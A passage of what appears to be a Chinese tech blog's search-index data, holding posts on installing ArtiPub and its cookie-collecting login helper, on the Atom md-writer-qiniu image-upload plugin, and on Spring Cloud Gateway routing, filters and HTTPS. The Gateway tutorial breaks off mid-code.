或者指定镜像源来安装，加快下载速度# npm install -g artipub --registry=https://registry.npm.taobao.org# 启动# artipub start# 默认会使用 "127.0.0.1:27017/artipub" 作为MongoDB的数据库链接，使用如下命令可以配置数据库信息等# artipub -h# 成功启动后，在浏览器中访问 `http://127.0.0.1:8000`，可以看到 Web 管理界面 源码安装 ArtiPub123456789101112131415161718192021222324# 提示：通过源码安装 ArtiPub，需要提前手动安装好 MongoDB# 克隆源码# git clone https://github.com/crawlab-team/artipub# 进入源码目录# cd artipub# 安装# npm install# 配置数据库# vim ./config.js# 配置后端服务的API地址# vim ./src/config/config.ts # 将 apiEndpoint 改成对应的 IP 地址 + 端口。# 启动前端服务# npm run start:frontend# 启动后端服务# npm run start:backend# 成功启动后，在浏览器中访问 `http://127.0.0.1:8000`，可以看到 Web 管理界面 ArtiPub 登录助手的使用ArtiPub 需要依赖登录助手（Chrome 浏览器插件）来获取用户在各个平台的账号信息，因此需要手动安装登录助手插件。ArtiPub 成功启动后，通过 http://127.0.0.1:8000 访问 Web 管理界面，点击页面上的 “登录助手” 菜单项，然后按照以下步骤安装插件： 点击” 下载登陆助手”，保存文件名为 artipub-helper.zip 在 Chrome 浏览器中输入 chrome://extensions，并开启开发者模式（点击右上角） 将下载的登陆助手文件 artipub-helper.zip 拖入浏览器中，浏览器将自动安装插件（如果不能拖拽，请刷新页面后重试） 在使用登陆助手之前，请确保各个平台的账号已经处于登陆状态 浏览器右上角点击安装好的插件图标，点击” 一键获取登陆信息”，插件将获取所有平台的 Cookie 注意：如果 ArtiPub 的后端服务没有部署在本机，请点击浏览器右上角的登录助手里的” 扳手” 按钮，输入后端服务的 IP 地址 + 端口号（默认 3000），然后再获取登陆信息 到” 平台管理” 页面，点击” 更新 Cookie 状态”（需要大约 1 分钟），然后查看 “Cookie 状态”，确保其为” 已导入” 状态 到” 文章管理” 页面，点击” 发布”，选择登陆方式为 “Cookie”，然后发布文章 ArtiPub 界面平台管理界面 文章管理界面 文章发布界面 文章编辑界面 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"Atom 编写 Markdown 将图片上传到七牛图床",url:"/posts/410644c5.html",text:'前言 七牛云免费提供 30 天有效期的七牛融合 CDN 测试域名，也支持绑定自定义域名，但要求自定义的域名必须备案 七牛云每月会免费提供 10 GB 存储空间、10 GB 下载流量、10 万次 PUT 请求、100 万次 GET 请求，但免费提供的存储资源只支持 HTTP 协议访问，若需要使用 HTTPS 协议，则需要按流量付费才能够使用 Atom 编写 Markdown 将图片到七牛图床，第一种方法是安装两款插件，分别是：markdown-assistant + qiniu-uploader，不支持上传本地文件到七牛云，只支持将剪贴面板里的图片上传到七牛云，在新版本的 Atom 中存在兼容性问题 Atom 编写 Markdown 将图片到七牛图床，第二种方法直接安装 md-writer-qiniu 插件，该插件是在 markdown-writer 的基础上新增了七牛图片上传的功能，支持上传本地图片到七牛云，支持将剪贴面板里的图片保存到本地或者上传到七牛云 Atom 安装 md-writer-qiniu 插件 12345678910111213# 进入 Atom 本地的插件目录$ cd ~/.atom/packages# 克隆代码，文件夹的名称必须是 markdown-writer ，即需要和 packagename 一致，否则插件无法正常使用$ git clone https://github.com/chenghm123/md-writer-qiniu.git markdown-writer# 进入源码目录$ cd markdown-writer# 安装依赖$ npm install# 重启 Atom md-writer-qiniu 快捷键冲突 md-writer-qiniu 的快捷键默认是 shift-ctrl-i，可能会与 toggle-dev-tools 的快捷键冲突，可以编辑 ~/.atom/keymap.cson 文件，更改 md-writer-qiniu 的快捷键，即下面的 "shift-ctrl-v": "markdown-writer:insert-image"： 1234567891011121314$ vim ~/.atom/keymap.cson".platform-linux atom-text-editor:not([mini])": "shift-ctrl-K": "markdown-writer:insert-link" "shift-ctrl-v": "markdown-writer:insert-image" "shift-ctrl-X": "markdown-writer:toggle-taskdone" "ctrl-i": "markdown-writer:toggle-italic-text" "ctrl-b": "markdown-writer:toggle-bold-text" "ctrl-\'": "markdown-writer:toggle-code-text" "ctrl-h": "markdown-writer:toggle-strikethrough-text" "ctrl-1": "markdown-writer:toggle-h1" "ctrl-2": "markdown-writer:toggle-h2" "ctrl-3": "markdown-writer:toggle-h3" "ctrl-4": "markdown-writer:toggle-h4" "ctrl-5": "markdown-writer:toggle-h5" md-writer-qiniu 插件配置 首先注册七牛云的账号，选择” 对象存储” 产品，然后创建存储空间（必须设置为公开访问），接着在 Atom 的插件配置中填写以下内容即可。 Qiniu Bucket 是七牛云存储空间的名称 Qiniu Domain 是七牛云存储空间的域名 AccessKey、SecretKey 即是在七牛云中的 AK、SK 如果希望将剪贴面板里的图片保存到本地目录，需要配置 Hexo 图片的默认保存目录，下述配置是将图片保存在 source/asset/{year}/{month} 本地目录下： md-writer-qiniu 插件的使用 使用快捷方式 shift-ctrl-i 或者 shift-ctrl-v，调出图片上传的界面（如下图），也可以导航到菜单： Packages –&gt; Markdown Writer –&gt; Markup –&gt; Insert Image。在下面的操作完成后，默认按下” 回车键 “，即表示开始上传图片或者保存图片到 Hexo 的图片目录。 第一种使用情况：当剪贴面板里有图片时，如果勾选了 “Save Image To”，则只会将剪贴面板里的图片保存到 Hexo 的图片目录，此时并不会上传到七牛云；若不勾选，则默认会将剪贴面板里的图片上传到七牛云。 第二种使用情况：当剪贴面板里没有图片时，此时点击 “Choose Local Image” 按钮从本地选择图片，若勾选了 ”Copy Image To”，则只会当本地图片保存到 Hexo 的图片目录，此时并不会上传到七牛云；若不勾选，则默认会将本地图片上传到七牛云。 使用总结： 若不勾选 ”Save Image To“或者 “Copy Image To” 选项，默认会将剪贴面板里的图片或者本地图片上传到七牛云 只要勾选了 ”Save Image To“或者 “Copy Image To” 选项，都不会将剪贴面板里的图片或者本地图片上传到七牛云 补充说明 使用上面提到的 md-writer-qiniu 插件将图片上传到七牛云后，默认的图片路径是 {YYYY}/{MM}/{DD}/{HHmmss}{random-string}{extname} 的格式， 该插件不支持自定义七牛云里的图片文件名 若需要自定义七牛云里的图片文件名，可以使用这个分支的 md-writer-qiniu 插件（安装方法和上面的插件一样），支持使用路径前缀（针对七牛云的存储路径）。当在该插件的配置项里不勾选 Qiniu File Random Name 选项时，默认的图片路径是 {keyPrefix}/{YYYY}/{MM}/{title}{extname}，也就是说可以指定 Title 作为七牛云图片的文件名，具体配置如下图： var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"Gateway 入门教程 - 中级篇",url:"/posts/802c502f.html",text:'上篇 - Gateway 入门教程（基础篇） Gateway 入门教程 - 基础篇 前言版本说明在本文中，默认使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，特别声明除外。 Gateway 基于服务发现的路由规则Gateway 的服务发现路由概述Spring Cloud 对 Zuul 进行封装处理之后，当通过 Zuul 访问后端微服务时，基于服务发现的默认路由规则是：http://zuul_host:zuul_port/微服务在 Eureka 上的 serviceld/**。 Spring Cloud Gateway 在设计的时候考虑了从 Zuul 迁移到 Gateway 的 兼容性和迁移成本等，Gateway 基于服务发现的路由规则和 Zuul 的设计类似，但是也有很大差别。Spring Cloud Gateway 基于服务发现的路由规则，在不同注册中心下其差异如下： 如果把 Gateway 注册到 Consul 上，通过网关转发服务调用，服务名默认小写，不需要做任何处理 如果把 Gateway 注册到 Zookeeper 上，通过网关转发服务调用，服务名默认小写，不需要做任何处理 如果把 Gateway 注册到 Eureka 上，通过网关转发服务调用，访问网关的 URL 是 http://Gateway_HOST:Gateway_PORT/大写的 serviceld/*，其中服务名默认必须是大写，否则会抛 404 错误；如果服务名要用小写访问，可以在属性配置文件里面加 spring.cloud.gateway.discovery.locator.lowerCaseServiceId=true 配置解决 Gateway 服务发现的路由规则案例下面将使用 Eureka 作为注册中心来剖析 Gateway 服务发现的路由规则，其中各个模块的说明如下，由于篇幅有限，这里只给出核心的配置和代码，点击下载完整的案例代码。 模块 端口 说明 micro-service-gateway-route N/A 聚合父 Maven 工程 micro-service-eureka 9000 Eureka 注册中心 micro-service-gateway 9001 基于 Spring Cloud Gateway 的网关服务 micro-service-provider 9002 服务提供者 micro-service-consumer 9003 服务消费者 1. 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt;&lt;/properties&gt;&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt;&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;source&gt;${java.version}&lt;/source&gt; &lt;target&gt;${java.version}&lt;/target&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 2. 创建 Micro Service Eureka 工程创建 Micro Service Eureka 的 Maven 工程，配置工程里的 pom.xml 文件： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Micro Service Eureka 的启动主类： 12345678@EnableEurekaServer@SpringBootApplicationpublic class EurekaServerApplication { public static void main(String[] args) { SpringApplication.run(EurekaServerApplication.class, args); }} 创建 Micro Service Eureka 的 application.yml 配置文件： 123456789101112131415server: port: 9000spring: application: name: eureka-servereureka: instance: hostname: localhost #Eureka服务端的实例名称 client: register-with-eureka: false #false表示不向注册中心注册自己 fetch-registry: false #false表示自己就是注册中心，职责就是维护服务实例，并不需要去检索服务 service-url: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 3. 创建 Micro Service Gateway 工程创建 Micro Service Gateway 的 Maven 工程，配置工程里的 pom.xml 文件，由于需要将 Gateway 服务注册到 Eureka，因此需要引入 Eureka Client；同时为了避免 Gateway 的依赖冲突，排除引入 spring-webmvc、spring-boot-starter-tomcat： 1234567891011121314151617181920212223242526&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt; 创建 Micro Service Gateway 的启动主类： 1234567@SpringBootApplicationpublic class GatewayServerApplication { public static void main(String[] args) { SpringApplication.run(GatewayServerApplication.class, args); }} 创建 Micro Service Gateway 的 application.yml 配置文件，其中 spring.cloud.gateway.discovery.locator.enabled 表示是否与服务发现组件进行结合，通过 serviceId 转发到具体的服务实例，默认为 false，若为 true 则开启基于服务发现的路由规则。spring.cloud.gateway.discovery.locator.lowerCaseServiceId=true 表示当注册中心为 Eureka 时，设置为 true 表示开启用小写的 serviceId 进行基于服务路由的转发。 1234567891011121314151617181920server: port: 9001spring: application: name: gateway-server cloud: gateway: discovery: locator: enabled: true lower-case-service-id: trueeureka: client: service-url: defaultZone: http://127.0.0.1:9000/eureka instance: instance-id: gateway-server-${server.port} prefer-ip-address: true 4. 创建 Micro Service Provider 工程创建 Micro Service Provider 的 Maven 工程，配置工程里的 pom.xml 文件： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Micro Service Provider 的启动主类： 12345678@EnableDiscoveryClient@SpringBootApplicationpublic class ProviderApplication { public static void main(String[] args) { SpringApplication.run(ProviderApplication.class, args); }} 创建 Micro Service Provider 的测试控制类： 123456789101112@RestController@RequestMapping("/provider")public class ProviderController { @Value("${server.port}") private String port; @GetMapping("/sayHello/{name}") public String sayHello(@PathVariable("name") String name) { return "from port: " + port + ", hello " + name; }} 创建 Micro Service Provider 的 application.yml 配置文件： 1234567891011121314server: port: 9002spring: application: name: provider-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:9000/eureka instance: instance-id: provider-service-${server.port} prefer-ip-address: true 5. 创建 Micro Service Consumer 工程创建 Micro Service Consumer 的 Maven 工程，配置工程里的 pom.xml 文件： 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Micro Service Consumer 的启动主类： 123456789@EnableFeignClients@EnableDiscoveryClient@SpringBootApplicationpublic class ConsumerApplication { public static void main(String[] args) { SpringApplication.run(ConsumerApplication.class, args); }} 创建 Micro Service Consumer 的服务调用接口： 123456@FeignClient("provider-service")public interface ProviderService { @RequestMapping(value = "/provider/sayHello/{name}", method = RequestMethod.GET) public String sayHello(@PathVariable("name") String name);} 创建 Micro Service Consumer 的测试控制类： 123456789101112@RestController@RequestMapping("/consumer")public class ConsumerController { @Autowired private ProviderService providerService; @GetMapping("/sayHello/{name}") public String sayHello(@PathVariable("name") String name) { return providerService.sayHello(name); }} 创建 Micro Service Consumer 的 application.yml 配置文件： 1234567891011121314server: port: 9003spring: application: name: consumer-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:9000/eureka instance: instance-id: consumer-service-${server.port} prefer-ip-address: true 6. 测试结果 依次启动 micro-service-eureka、micro-service-gateway、micro-service-provider、micro-service-consumer 应用 访问 http://127.0.0.1:9000/，查看各个服务是否都成功注册到 Eureka 访问 http://127.0.0.1:9001/consumer-service/consumer/sayHello/Peter，查看是否可以成功通过 Gateway 调用 Consumer 的接口 Gateway Filter 和 Global FilterSpring Cloud Gateway 中的 Filter 从接口实现上分为两种：一种是 Gateway Filter，另外一种是 Global Filter。下面将给出这两种 Filter 的自定义使用示例，点击下载完整的案例代码。 Gateway Filter 和 Global Filter 的概述 Gateway Filter： 从 Web Filter 中复制过来的，相当于一个 Filter 过滤器，可以对访问的 URL 过滤，进行横切处理（切面处理），应用场景包括超时处理、安全检查等。 Global Filter： Spring Cloud Gateway 定义了 Global Filter 的接口，可以让开发者自定义实现自己的 Global Filter。顾名思义，Global Filter 是一个全局的 Filter，作用于所有路由。 Gateway Filter 和 Global Filter 的区别从路由的作用范围来看，Global Filter 会被应用到所有的路由上，而 Gateway Filter 则应用到单个路由或者一个分组的路由上。从源码设计来看，Gateway Filter 和 Global Filter 两个接口中定义的方法一样，都是 Mono filter()，唯一的区别就是 Gateway Filter 继承了 ShortcutConfigurable，而 Global Filter 没有任何继承。 自定义 Gateway Filter 案例 创建自定义的 Gateway Filter 1234567891011121314151617181920212223public class CustomGatewayFilter implements GatewayFilter, Ordered { private static final Logger logger = LoggerFactory.getLogger(CustomGatewayFilter.class); private static final String COUNT_START_TIME = "countProcessTime"; @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { exchange.getAttributes().put(COUNT_START_TIME, System.currentTimeMillis()); return chain.filter(exchange).then( Mono.fromRunnable(() -&gt; { Long startTime = exchange.getAttribute(COUNT_START_TIME); if (startTime != null) { Long countTime = System.currentTimeMillis() - startTime; logger.info(exchange.getRequest().getURI().getRawPath() + ": " + countTime + " ms"); } })); } @Override public int getOrder() { return Ordered.LOWEST_PRECEDENCE; }} 将 Gateway Filter 配置到路由上，由于 Gateway Filter 是作用于单个路由或者一个分组的路由上的，因此这里需要使用 Java 的流式 API 绑定 Gateway Filter 和路由，或者使用 YML 文件的方式配置路由 123456789101112131415@Configurationpublic class CommonConfiguration { @Bean public RouteLocator customGatewayFilter(RouteLocatorBuilder builder) { return builder.routes() .route(r -&gt; r.path("/custom/gateway/filter") .filters(f -&gt; f.filter(new CustomGatewayFilter())) .uri("http://127.0.0.1:9090/provider/sayHello/Jim/") .order(0) .id("custom-gateway-filter") ) .build(); }} 自定义 Global Filter 案例下面通过简单定义一个名为 CustomGlobalFilter 的全局过滤器，对请求到网关的 URL 进行权限校验，判断请求的 URL 是否为合法请求。全局过滤器处理的逻辑是通过从 Gateway 的 上下文 ServerWebExchange 对象中获取 authToken 对应的值进行判 Null 处理，也可以根据需求定制开发更复杂的校验逻辑。因为 Global Filter 是作用在所有的路由上，因此只需要添加 @Component 注解，将 CustomGlobalFilter 的 Bean 注入进 Spring 的容器内即可。 123456789101112131415161718@Componentpublic class CustomGlobalFilter implements GlobalFilter, Ordered { @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { String token = exchange.getRequest().getQueryParams().getFirst("authToken"); if (null == token || token.isEmpty()) { exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED); return exchange.getResponse().setComplete(); } return chain.filter(exchange); } @Override public int getOrder() { return -400; }} Gateway 实战场景Spring Cloud Gateway 权重路由WeightRoutePredicateFactory 是一个路由断言工厂，在 Spring Cloud Gateway 中可以使用它对 URL 进行权重路由，只需在配置时指定分组和权重值即可。 权重路由的使用场景在开发、测试的时候，或者线上发布、线上服务多版本控制的时候，需要对服务进行权重路由。最常见的使用场景就是一个服务有两个版本：旧版本 V1、新版本 V2。在线上灰度发布的时候，需要通过网关动态实时推送路由权重信息。比如 95% 的流量走服务 V1 版本，5% 的流量走服务 V2 版本。 权重路由案例下面的案例中，Spring Cloud Gateway 会根据权重路由规则，针对特定的服务，把 95% 的请求流量分发给服务的 V1 版本，把剩余 5% 的流量分发给服务的 V2 版本，由此进行权重路由，点击下载完整的案例代码。 创建 Gateway Server 工程里的 pom.xml 配置文件： 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Gateway Server 工程里的启动主类： 1234567@SpringBootApplicationpublic class GatewayServerApplication { public static void main(String[] args) { SpringApplication.run(GatewayServerApplication.class, args); }} 创建 Gateway Server 工程里的 application.yml 配置文件，添加两个针对 /test 路径转发的路由定义配置，这两个路由属于同一个权重分组，权重的分组名称为 group： 12345678910111213141516171819202122232425262728293031323334server: port: 9090spring: application: name: gateway-server cloud: gateway: routes: - id: provider-service-v1 uri: http://127.0.0.1:9091/v1/ predicates: - Path=/test - Weight=group, 95 - id: provider-service-v2 uri: http://127.0.0.1:9091/v2/ predicates: - Path=/test - Weight=group, 5logging: level: org.springframework.cloud.gateway: TRACE org.springframework.http.server.reactive: DEBUG org.springframework.web.reactive: DEBUG reactor.ipc.netty: DEBUGmanagement: endpoints: web: exposure: include: \'*\' security: enabled: false 创建 Provider Service 工程里的测试控制器： 12345678910111213@RestControllerpublic class ProviderController { @GetMapping("/v1") public String v1() { return "version: v1"; } @GetMapping("/v2") public String v2() { return "version: v2"; }} 创建 Provider Service 工程里的启动主类： 1234567@SpringBootApplicationpublic class ProviderApplication { public static void main(String[] args) { SpringApplication.run(ProviderApplication.class, args); }} 创建 Provider Service 工程里的 application.yml 配置文件： 123456server: port: 9091spring: application: name: provider-service 测试结果： 依次启动 gateway-server、provider-service 应用 多次访问 http://127.0.0.1:9090/test ，会发现按权重配置返回对应的请求内容 Spring Cloud Gateway 的 HTTPS 使用大型互联网应用的生产环境基本是全站 HTTPS，常规的做法是通过 Nginx 来配置 SSL 证书。如果使用 Spring Cloud Gateway 作为 API 网关，统一管理所有 API 请求的入口和出口，此时 Spring Cloud Gateway 就需要支持 HTTPS。由于 Spring Cloud Gateway 是基于 Spring Boot 2.0 构建的，所以只需要将生成的 HTTPS 证书放到 Spring Cloud Gateway 应用的类路径下面即可。 HTTPS 案例下面将介绍如何在 Spring Cloud Gateway 中使用 HTTPS，其中各个模块的说明如下。由于本案例是基于上面的 “Gateway 服务发现的路由规则案例 “ 改造而来的，因此 micro-service-eureka、micro-service-provider-1、micro-service-provider-2 工程里的配置和代码不再累述，点击下载完整的案例代码。 模块 端口 说明 micro-service-gateway-https N/A 聚合父 Maven 工程 micro-service-eureka 9000 Eureka 注册中心 micro-service-gateway 9001 带有 HTTPS 证书的网关服务，使用 HTTPS 协议访问 micro-service-provider-1 9002 服务提供者，使用 HTTP 协议 micro-service-provider-2 9003 服务提供者，使用 HTTP 协议 创建 Micro Service Gateway 工程里的 pom.xml 配置文件： 1234567891011121314151617181920212223242526&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt; 创建 Micro Service Gateway 工程里的启动主类： 1234567@SpringBootApplicationpublic class GatewayServerApplication { public static void main(String[] args) { SpringApplication.run(GatewayServerApplication.class, args); }} 创建 Micro Service Gateway 工程里的 application.yml 配置文件，通过 key-store 指定 HTTPS 证书的路径： 12345678910111213141516171819202122232425262728server: port: 9001 ssl: enabled: true key-alias: spring key-password: spring key-store: classpath:self-signed.jks key-store-type: JKS key-store-provider: SUN key-store-password: springspring: application: name: gateway-server cloud: gateway: discovery: locator: enabled: true lower-case-service-id: trueeureka: client: service-url: defaultZone: http://127.0.0.1:9000/eureka instance: instance-id: gateway-server-${server.port} prefer-ip-address: true 测试结果： 依次启动 micro-service-eureka、micro-service-provider-1、micro-service-provider-2、micro-service-gateway 应用 通过 HTTPS 协议访问 https://127.0.0.1:9001/provider-service/provider/sayHello/Jim，会出现如下的错误： 123456789101112131415161718io.netty.handler.ssl.NotSslRecordException: not an SSL/TLS record: 485454502f312e3120343030200d0a5472616e736665722d456e636f646 ... at io.netty.handler.ssl.SslHandler.decodeJdkCompatible(SslHandler.java:1156) [netty-handler-4.1.25.Final.jar:4.1.25.Final] at io.netty.handler.ssl.SslHandler.decode(SslHandler.java:1221) [netty-handler-4.1.25.Final.jar:4.1.25.Final] at io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:489) ~[netty-codec-4.1.25.Final.jar:4.1.25.Final] at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:428) ~[netty-codec-4.1.25.Final.jar:4.1.25.Final] at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:265) ~[netty-codec-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1434) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:965) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.epoll.AbstractEpollStreamChannel$EpollStreamUnsafe.epollInReady(AbstractEpollStreamChannel.java:808) ~[netty-transport-native-epoll-4.1.25.Final-linux-x86_64.jar:4.1.25.Final] at io.netty.channel.epoll.EpollEventLoop.processReady(EpollEventLoop.java:408) ~[netty-transport-native-epoll-4.1.25.Final-linux-x86_64.jar:4.1.25.Final] at io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:308) ~[netty-transport-native-epoll-4.1.25.Final-linux-x86_64.jar:4.1.25.Final] at io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:884) ~[netty-common-4.1.25.Final.jar:4.1.25.Final] at java.lang.Thread.run(Thread.java:745) ~[na:1.8.0_102] HTTPS 转 HTTP 的问题上述错误出现的原因是通过 Spring Cloud Gateway 请求进来的协议是 HTTPS，而后端被代理的服务是 HTTP 协议的请求，所以当 Gateway 用 HTTPS 请求转发调用 HTTP 协议的服务时，就会出现 not an SSL/TLS record 的错误。本质上这是一个 Spring Cloud Gateway 将 HTTPS 请求转发调用 HTTP 服务的问题。由于服务的拆分，在微服务的应用集群中会存在很多服务提供者和服务消费者，而这些服务提供者和服务消费者基本都是部署在企业内网中，没必要全部加 HTTPS 进行调用。因此 Spring Cloud Gateway 对外的请求是 HTTPS，对后端代理服务的请求可以是 HTTP。通过 Debug 调试源码分析，LoadBalancerClientFilter.filter() 方法如下： 123456789URI uri = exchange.getRequest().getURI();String overrideScheme = null;if (schemePrefix != null) { overrideScheme = url.getScheme();}URI requestUrl = this.loadBalancer.reconstructURI(new 